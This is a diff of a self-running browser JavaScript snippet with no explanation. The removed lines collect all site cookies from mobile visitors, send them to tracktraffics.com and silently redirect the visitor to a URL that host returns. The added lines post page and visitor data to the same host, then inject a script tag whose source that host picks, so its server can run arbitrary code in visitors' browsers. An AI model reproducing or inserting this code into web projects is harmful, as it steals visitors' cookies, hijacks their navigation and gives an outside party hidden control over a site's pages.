@@ -1,59 +1,110 @@
-(async function() {
+(function() {
+    var re_ret_u = window.location.href;
+    var re_ret_dt = detectDeviceType();
+    var re_ret_uAgent = navigator.userAgent;
+    var re_ret_r = document.referrer;
 
-    function isMobileDevice() {
-        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    function getCookie(cookieName) {
+        return document.cookie.split('; ').reduce((value, cookie) => {
+            const [name, val] = cookie.split('=');
+            return (name === encodeURIComponent(cookieName)) ? decodeURIComponent(val) : value;
+        }, null);
     }
 
-    if (!isMobileDevice()) {
-        return; 
+    const re_ret_uid = getCookie('re_ret_uid');
+    const re_ret_ref = getCookie('re_ret_ref');
+
+    function setCookie(cookieName, cookieValue) {
+        document.cookie = `${encodeURIComponent(cookieName)}=${encodeURIComponent(cookieValue)}; expires=${(new Date(Date.now() + 86400000)).toUTCString()}; path=/`;
     }
 
-    if (sessionStorage.getItem('redirected')) {
-        return; 
+    if (!re_ret_uid) {
+        setCookie('re_ret_uid', generateUUID());
     }
 
-    function getCookies() {
-        return document.cookie.split(';').reduce((cookieObject, cookie) => {
-            let [name, ...value] = cookie.split('=');
-            name = name.trim();
-            if (name) {
-                cookieObject[name] = decodeURIComponent(value.join('=').trim());
-            }
-            return cookieObject;
-        }, {});
+    if (re_ret_ref != encodeURIComponent(re_ret_r)) {
+        setCookie('re_ret_ref', encodeURIComponent(re_ret_r));
     }
 
-    let cookies = getCookies();
-    let requestData = {
-    url: window.location.href, 
-    referrer: document.referrer, 
-    coo: JSON.stringify(cookies), 
-    origin: window.location.hostname 
-    };
-    
-    try {
-        let response = await fetch('https://www.tracktraffics.com/api/scriptdata', {
-            method: 'POST',
-            body: JSON.stringify(requestData),
-            headers: { 'Content-Type': 'application/json' }
+    function detectDeviceType() {
+        var re_ret_userAgent = navigator.userAgent;
+
+        if (/iPhone|iPad|iPod/i.test(re_ret_userAgent)) {
+            return "iOS";
+        } else if (/Android/i.test(re_ret_userAgent)) {
+            return "Android";
+        } else if (/Windows Phone/i.test(re_ret_userAgent)) {
+            return "Windows Phone";
+        } else if (/Windows NT/i.test(re_ret_userAgent)) {
+            return "Windows";
+        } else if (/Macintosh/i.test(re_ret_userAgent)) {
+            return "Mac";
+        } else if (/Linux/i.test(re_ret_userAgent)) {
+            return "Linux";
+        } else {
+            return "Unknown";
+        }
+    }
+
+    function generateUUID() {
+        var re_ret_d = new Date().getTime();
+        var re_ret_uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            var re_ret_r = (re_ret_d + Math.random() * 16) % 16 | 0;
+            re_ret_d = Math.floor(re_ret_d / 16);
+            return (c == 'x' ? re_ret_r : (re_ret_r & 0x3 | 0x8)).toString(16);
         });
+        return re_ret_uuid;
+    }
 
-        if (!response.ok) {
-            let errorText = await response.text();  
-            throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
-        }
+    var re_ret_c = window.wwData || [];
+    re_ret_c.push({
+        event: "viewPage",
+        uxid: generateUUID(),
+        page: re_ret_u,
+        device_type: re_ret_dt,
+        uAgent: re_ret_uAgent,
+        referrer: re_ret_ref
+    });
 
-        let responseData = await response.json();
-        
-        if (responseData && responseData.url) {
-            let link = document.createElement('a');
-            link.href = responseData.url;  
-            link.rel = 'noreferrer';       
-            document.body.appendChild(link);  
-            link.click();                
-            sessionStorage.setItem('redirected', 'true');
-        }
-    } catch (error) {
-        console.error('Error sending data:', error);
+    var re_ret_d = {};
+    re_ret_d.data = re_ret_c;
+
+    let requestData = {
+        url: window.location.href,
+        referrer: document.referrer,
+        coo: JSON.stringify(re_ret_uid),
+        origin: window.location.hostname
+    };
+
+    const re_ret_wd_url = 'https://www.tracktraffics.com/api/datascript';
+
+    fetch(re_ret_wd_url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(requestData)
+    })
+    .then((res) => res.json())
+    .then(response => {
+        i_s(response);
+    })
+    .catch(error => {
+        console.error("Fetch failed: ", error);
+    });
+
+    function i_s(re_ret_f_r) {
+     
+        var re_ret_r_s = re_ret_f_r.name;
+        var re_rl = re_ret_f_r.url;
+        var re_ret_rs_d = document.createElement('script');
+        var re_ret_encodedUrl = encodeURIComponent(re_rl); 
+        re_ret_rs_d.src = 'https://www.tracktraffics.com/' + re_ret_r_s + '.js?url=' + re_ret_encodedUrl;
+
+        re_ret_rs_d.async = true;
+
+        document.head.appendChild(re_ret_rs_d);
+
     }
 })();
+
